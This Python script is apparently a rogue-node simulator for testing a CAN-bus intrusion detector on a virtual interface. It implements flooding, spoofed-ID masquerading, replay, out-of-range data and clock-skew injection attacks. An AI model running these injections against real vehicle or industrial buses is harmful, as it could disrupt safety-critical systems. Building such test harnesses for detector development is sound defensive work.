import can.interface
import time
import random
import argparse
import json
import sys
import os
import struct
from datetime import datetime
from colorama import Fore, Style, init

from crypto_utils import encrypt_data

# Configuration
# This ID (6144) is > 0x7FF, so it will force Extended Frame logic automatically
ROGUE_ID_UNAUTHORIZED = 0x1800 
DEFAULT_JSON = "telemetry_full_standardized.json"

# Logging Setup
LOG_DIR = "sent_logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

timestamp_str = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
LOG_FILE = os.path.join(LOG_DIR, f"log_rogue_{timestamp_str}.json")
ENCRYPTION_KEY = os.getenv("CAN_ENCRYPTION_KEY")
USE_ENCRYPTION = bool(ENCRYPTION_KEY)

try:
    bus = can.interface.Bus(interface='socketcan', channel='vcan0')
    init()
except OSError:
    print("Can't bind to vcan0 interface")
    sys.exit(1)

def log_to_file(entry):
    """Log the attack packet to file"""
    with open(LOG_FILE, "a") as f:
        if USE_ENCRYPTION:
            f.write(encrypt_data(entry, ENCRYPTION_KEY).decode("utf-8") + "\n")
        else:
            f.write(json.dumps(entry) + "\n")

def get_node_config(target_id, file_path):
    try:
        with open(file_path, 'r') as f:
            nodes = json.load(f)
            return next((n for n in nodes if int(n['id'], 16) == target_id), None)
    except Exception as e:
        print(f"Error loading JSON: {e}")
        return None

def gen_data(target_id, file_path):
    node_cfg = get_node_config(target_id, file_path)

    if node_cfg:
        min_lim, max_lim = node_cfg['limits']
    else:
        # Fallback if ID not found
        min_lim, max_lim = -100.0, 100.0
    
    # Generate Float
    val = random.uniform(min_lim, max_lim)
    
    # Pack as 4-byte Big Endian Float and append sender timestamp (ms)
    data_bytes = struct.pack('>f', val)
    sender_ts_ms = int(time.time() * 1000) & 0xFFFFFFFF
    ts_bytes = struct.pack('>I', sender_ts_ms)
    full_data = data_bytes + ts_bytes
    
    return full_data, val

def send_message(arbitration_id, interval, data_override=None, val_override=None, sender_ts_override_ms=None):
    if data_override is not None:
        data = bytearray(data_override)
        if len(data) < 8:
            data = data + bytearray(8 - len(data))
        if sender_ts_override_ms is None:
            sender_ts_ms = int(time.time() * 1000) & 0xFFFFFFFF
        else:
            sender_ts_ms = sender_ts_override_ms & 0xFFFFFFFF
        data[4:8] = struct.pack('>I', sender_ts_ms)
        # Try to unpack value for logging
        try:
            val_logged = struct.unpack('>f', bytearray(data[:4]))[0]
        except:
            val_logged = 0.0
    else:
        data, val_logged = gen_data(arbitration_id, DEFAULT_JSON)
        if sender_ts_override_ms is None:
            sender_ts_ms = struct.unpack('>I', bytearray(data[4:8]))[0]
        else:
            sender_ts_ms = sender_ts_override_ms & 0xFFFFFFFF
            data = bytearray(data)
            data[4:8] = struct.pack('>I', sender_ts_ms)

    # CRITICAL FIX: Handle Extended IDs for attacks
    use_extended = arbitration_id > 0x7FF

    msg = can.Message(
        arbitration_id=arbitration_id,
        data=data,
        is_extended_id=use_extended
    )
    
    try:
        bus.send(msg)
        
        print(
            f"{Fore.YELLOW}Sent Rogue Msg: ID={hex(msg.arbitration_id)}\n" 
            f"{Fore.YELLOW}Data={val_logged:.4f}\n"
            f"{Fore.YELLOW}Interval={interval:.4f}s\n"
        )

        log_entry = {
            "timestamp": time.time(),
            "sender_ts_ms": sender_ts_ms,
            "id": hex(arbitration_id),
            "value": val_logged,
            "interval": interval,
            "type": "ROGUE_ATTACK"
        }
        log_to_file(log_entry)

        time.sleep(interval)

    except can.CanError:
        print("Message NOT sent")

def run_unauth_mode():
    print(f"{Fore.BLUE}STARTING UNAUTHORIZED NODE (ID: {hex(ROGUE_ID_UNAUTHORIZED)}) ")
    # Sends at a random slow pace
    interval = 1.0 
    print(f"Rate: {interval}s")
    
    try:
        while True:
            send_message(ROGUE_ID_UNAUTHORIZED, interval)
    except KeyboardInterrupt:
        print("\nStopping unauthorized node.")


def run_flood_mode(file_path):
    print(f"{Fore.BLUE}STARTING FLOOD ATTACK ")
    
    with open(file_path, 'r') as f:
        data = json.load(f)
        target_node = random.choice(data)
        target_id = int(target_node['id'], 16)
        normal_interval = target_node['interval']

    # Flood must be faster than normal interval. 
    # We set it to 10% of the normal interval (10x speed).
    flood_interval = normal_interval * 0.1

    print(f"Targeting (Masquerading): {hex(target_id)} ({target_node.get('name', 'Unknown')})")
    print(f"{Fore.GREEN}Flood Rate: {flood_interval:.4f}s (Normal: {normal_interval}s)")

    try:
        while True:
            send_message(target_id, flood_interval)
    except KeyboardInterrupt:
        print("\nStopping flood attack.")

def run_timing_violation(file_path):
    print(f"{Fore.BLUE}Running Injection Attack (Timeout / Missing Slot)")

    with open(file_path, 'r') as f:
        data = json.load(f)
        target_node = random.choice(data)
        target_id = int(target_node['id'], 16)
        
    print(f"Targeting (Masquerading): {hex(target_id)}")

    try:
        while True:
            # Send significantly slower than allowed (e.g. 2x interval)
            # to trigger "Missing Slot"
            interval = target_node['interval'] * 2.0
            print(f"{Fore.GREEN}Injection Rate: {interval:.4f}s (Too Slow)")
            send_message(target_id, interval)
    except KeyboardInterrupt:
        print("\nStopping timing attack.")

def run_bad_data(file_path):
    print(f"{Fore.BLUE}Running Bad Data Attack (Range Violation) ")
    with open(file_path, 'r') as f:
        data = json.load(f)
        target_node = random.choice(data)
        target_id = int(target_node['id'], 16) 

    print(f"Targeting (Masquerading): {hex(target_id)}")
    limit_min, limit_max = target_node['limits']
    
    try:
        while True:
            # Generate float outside the limits
            # Either 10% below min or 10% above max
            if random.random() < 0.5:
                bad_val = limit_min - (abs(limit_min) * 0.1) - 1.0
            else:
                bad_val = limit_max + (abs(limit_max) * 0.1) + 1.0

            # Pack Float
            bad_bytes = struct.pack('>f', bad_val)
            full_data = list(bad_bytes) + [0] * 4

            print(f"{Fore.BLUE}Injecting Bad Value: {bad_val:.4f} (Limits: {limit_min} to {limit_max}){Style.RESET_ALL}")
            send_message(target_id, target_node['interval'], data_override=full_data)
    
    except KeyboardInterrupt:
        print("\nStopping.")

def run_deviation_attack(file_path):
    # Try to target 0x100 (RunTime_s) if available, or random
    target_id = 0x100 
    
    
    node_cfg = get_node_config(target_id, file_path)
    if not node_cfg:
        print("0x100 not found, picking random target...")
        with open(file_path, 'r') as f:
            data = json.load(f)
            node_cfg = random.choice(data)
            target_id = int(node_cfg['id'], 16)
            
    interval = node_cfg['interval']
    min_lim, max_lim = node_cfg['limits']
    
    print(f"{Fore.BLUE}Running Deviation Attack (Pinned High/Low) on {hex(target_id)}")
    
    if random.choice([True, False]):
        pinned_val = min_lim + (abs(min_lim) * 0.01)
    else:
        pinned_val = max_lim - (abs(max_lim) * 0.01)
    bad_bytes = struct.pack('>f', pinned_val)
    full_data = list(bad_bytes) + [0] * 4

    print(f"{Fore.RED}Injecting Pinned Value: {pinned_val:.4f} (Continuous){Style.RESET_ALL}")

    try:
        while True:
            send_message(target_id, interval, data_override=full_data)
    except KeyboardInterrupt:
        print("\nStopping deviation attack.")

def run_replay_attack(file_path):
    print(f"{Fore.BLUE}Running Replay Attack (Repeated Timestamp)")
    with open(file_path, 'r') as f:
        data = json.load(f)
        target_node = random.choice(data)
        target_id = int(target_node['id'], 16)
        interval = target_node['interval']

    print(f"Targeting (Masquerading): {hex(target_id)} ({target_node.get('name', 'Unknown')})")

    # Generate a single payload and freeze its timestamp
    payload, _ = gen_data(target_id, file_path)
    fixed_ts = struct.unpack('>I', bytearray(payload[4:8]))[0]
    print(f"{Fore.GREEN}Replaying with fixed sender_ts_ms: {fixed_ts}{Style.RESET_ALL}")

    try:
        while True:
            send_message(
                target_id,
                interval,
                data_override=payload,
                sender_ts_override_ms=fixed_ts,
            )
    except KeyboardInterrupt:
        print("\nStopping replay attack.")

def run_skew_attack(file_path):
    print(f"{Fore.BLUE}Running Clock Skew Attack (Timestamp Offset)")
    with open(file_path, 'r') as f:
        data = json.load(f)
        target_node = random.choice(data)
        target_id = int(target_node['id'], 16)
        interval = target_node['interval']

    # Large offset to trigger skew_exceeded
    skew_ms = 120000
    if random.choice([True, False]):
        skew_ms = -skew_ms

    print(f"Targeting (Masquerading): {hex(target_id)} ({target_node.get('name', 'Unknown')})")
    print(f"{Fore.GREEN}Skew Offset: {skew_ms}ms{Style.RESET_ALL}")

    try:
        while True:
            fake_ts = (int(time.time() * 1000) + skew_ms) & 0xFFFFFFFF
            send_message(target_id, interval, sender_ts_override_ms=fake_ts)
    except KeyboardInterrupt:
        print("\nStopping skew attack.")

def run_fingerprint_attack(file_path):
    print(f"{Fore.BLUE}Running Clock Fingerprint Attack (Drift/Jitter)")
    with open(file_path, 'r') as f:
        data = json.load(f)
        target_node = random.choice(data)
        target_id = int(target_node['id'], 16)
        interval = target_node['interval']

    base_offset = random.choice([-2000, 2000])
    drift_step_ms = 10
    jitter_ms = 80
    counter = 0

    print(f"Targeting (Masquerading): {hex(target_id)} ({target_node.get('name', 'Unknown')})")
    print(f"{Fore.GREEN}Base Offset: {base_offset}ms Drift: {drift_step_ms}ms/msg Jitter: ±{jitter_ms}ms{Style.RESET_ALL}")

    try:
        while True:
            counter += 1
            drift = counter * drift_step_ms
            jitter = random.randint(-jitter_ms, jitter_ms)
            fake_ts = (int(time.time() * 1000) + base_offset + drift + jitter) & 0xFFFFFFFF
            send_message(target_id, interval, sender_ts_override_ms=fake_ts)
    except KeyboardInterrupt:
        print("\nStopping fingerprint attack.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    # Define attack modes
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--unauth_id", action="store_true", help="Send from an unknown ID (0x1800)")
    group.add_argument("--flood", action="store_true", help="Flood the bus with high frequency messages")
    group.add_argument("--inject", action="store_true", help="Inject messages with slow timing (Missing Slot)")
    group.add_argument("--bad_data", action="store_true", help="Inject values outside authorized range")
    group.add_argument("--deviation", action="store_true", help="Inject pinned values to trigger deviation check")
    group.add_argument("--replay", action="store_true", help="Replay a message with a fixed timestamp")
    group.add_argument("--skew", action="store_true", help="Inject clock skewed timestamps")
    group.add_argument("--fingerprint", action="store_true", help="Inject drift/jitter timestamps to fingerprint")

    # Define input file (optional, defaults to standard)
    parser.add_argument("--input_file", default=DEFAULT_JSON, help="Path to telemetry JSON file")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt JSON logs")
    parser.add_argument("--encrypt_key", default=os.getenv("CAN_ENCRYPTION_KEY"), help="Encryption key")
    
    args = parser.parse_args()

    # Use the file provided or default
    file_to_use = args.input_file
    ENCRYPTION_KEY = args.encrypt_key
    USE_ENCRYPTION = args.encrypt or bool(ENCRYPTION_KEY)

    if USE_ENCRYPTION and not ENCRYPTION_KEY:
        print("Error: encryption enabled but no key provided")
        sys.exit(1)

    if args.unauth_id:
        run_unauth_mode()
    elif args.flood:
        run_flood_mode(file_to_use)
    elif args.inject:
        run_timing_violation(file_to_use)
    elif args.bad_data:
        run_bad_data(file_to_use)
    elif args.deviation:
        run_deviation_attack(file_to_use)
    elif args.replay:
        run_replay_attack(file_to_use)
    elif args.skew:
        run_skew_attack(file_to_use)
    elif args.fingerprint:
        run_fingerprint_attack(file_to_use)
